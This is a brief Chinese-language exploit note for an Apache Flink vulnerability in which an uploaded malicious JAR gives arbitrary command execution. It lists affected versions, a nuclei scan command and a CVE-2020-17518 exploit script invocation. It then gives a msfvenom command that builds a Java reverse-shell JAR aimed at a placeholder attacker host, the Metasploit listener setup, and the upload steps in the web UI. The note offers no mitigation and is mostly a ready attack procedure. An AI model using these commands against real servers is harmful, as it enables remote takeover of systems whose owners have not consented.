## 漏洞概述
Apache Flink  恶意JAR包上传，导致任意命令执行，反弹shell

## 影响范围
```http
Flink < 1.11.3
Flink < 1.12.0
```

## POC
```bash
nuclei.exe -tags apache -t cves/ -stats -u http://test.com:8081
```

## EXP

1、Py脚本

```python
python CVE-2020-17518.py http://example.com:8081
```

2、MSF

```bash
#生成木马
msfvenom -p java/meterpreter/reverse_tcp LHOST=xxx.xxx.xxx.xxx  LPORT=4444 -f jar > test.jar

#监听端口
use exploit/multi/handler
set payload java/shell/reverse_tcp
set lhost xxx.xxx.xxx.xxx
set lport 4444
run
```

点击查看文件上传页面 -> 点击 Add 上传 jar 文件

## 参考链接

[CVE-2020-17519 & CVE-2020-17518 分析](https://xz.aliyun.com/t/8993?page=1)